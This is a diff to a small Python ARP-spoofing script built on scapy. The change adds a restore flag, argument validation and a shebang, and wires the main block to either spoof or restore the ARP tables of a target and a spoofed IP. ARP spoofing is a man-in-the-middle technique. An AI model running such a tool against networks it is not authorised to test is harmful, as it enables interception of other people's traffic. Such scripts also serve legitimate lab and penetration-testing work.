@@ -1,5 +1,7 @@
+#! /bin/python
 import scapy.all as scapy
 import argparse
+import os
 
 def arp_ask(target_ip):
     arp_request = scapy.ARP(pdst=target_ip)
@@ -31,12 +33,23 @@ def spoof(target_ip, spoof_ip):
         print("ARP tables restored.")
         return
 
+
+
 if __name__ == "__main__":
     args_parse = argparse.ArgumentParser(description="Spoof ip address")
     args_parse.add_argument('-t', '--target', type=str, help='IP of the target')
     args_parse.add_argument('-s', '--spoof', type=str, help='spoofed IP address')
+    args_parse.add_argument('-r', '--restore', action='store_true', help='restore ARP tables')
 
     args = args_parse.parse_args()
+    
+    if not args.target or not args.spoof: 
+        print("You must provide a target and a spoofed IP address")
+        os._exit(1)
 
-
-    spoof(args.target,args.spoof)
+    if args.restore:
+        arp_restore(args.target,args.spoof)
+        arp_restore(args.spoof,args.target)
+        print("ARP tables restored.")
+    else:
+        spoof(args.target,args.spoof)
